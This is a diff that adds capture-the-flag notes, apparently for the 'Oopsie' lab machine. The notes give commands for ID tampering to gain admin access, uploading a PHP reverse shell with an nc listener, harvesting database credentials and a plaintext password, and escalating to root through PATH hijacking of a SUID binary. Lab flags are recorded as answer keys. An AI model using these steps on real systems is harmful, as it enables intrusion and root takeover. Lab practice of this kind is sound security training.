@@ -151,3 +151,39 @@ cd C:\Users\Administrator\Destop
 type root.txt
 #root flag: b91ccec3305e98240082d4474b848528
 ```
+
+## Oopsie
+
+```shell
+http://<ip_address>/cdn-cgi/login
+# use burpsuite 
+# change id from 2 to 1
+http://<ip-address>/cdn-cgi/login/admin.php?content=accounts&id=1
+# change role to admin and id to 34322
+# wfuzz will flag /uploads
+http://<ip_address>/uploads/php-reverse-shell.php
+cp /usr/share/webshells/php/php-revere-shell.php
+# change ip address and port
+nc -lvnp 9001
+cd /home/robert
+cat user.txt
+# user flag: f2c74ee8db7983851ab2a96a44eb7981
+cat /var/www/html/cdn-cgi/login/db.php
+# $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+find / -group bugtracker 2>/dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# must be in bash shell
+su robert
+# password: M3g4C0rpUs3r!
+./usr/bin/bugtracker
+file bugtracker
+# Set UID (Set owner User ID)
+cd /tmp
+echo "/bin/sh" >> cat
+cd /usr/bin
+export PATH=/tmp:$PATH
+./bugtracker
+view /root/root.txt
+# root flag: af13b0bee69f8a877c3faf667f7beacf
+
+```
